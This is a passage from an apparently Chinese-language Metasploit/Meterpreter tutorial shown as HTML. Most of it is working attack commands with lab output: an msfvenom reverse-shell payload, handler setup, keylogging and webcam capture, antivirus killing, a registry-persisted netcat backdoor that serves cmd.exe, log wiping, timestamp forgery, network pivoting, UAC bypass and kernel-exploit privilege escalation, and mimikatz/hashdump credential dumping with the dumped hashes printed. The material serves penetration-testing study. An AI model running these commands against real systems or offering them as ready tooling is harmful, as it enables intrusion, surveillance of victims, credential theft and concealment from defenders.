Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-2"><a href="#4-Meterpreter基本命令-2" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-2"><a href="#4-1-基本系统命令-2" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-2"><a href="#4-2-文件系统命令-2" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-2"><a href="#4-3-网络命令-2" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-2"><a href="#4-4-信息收集-2" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-2"><a href="#4-5-提权-2" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-2"><a href="#4-6-获取凭证-2" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

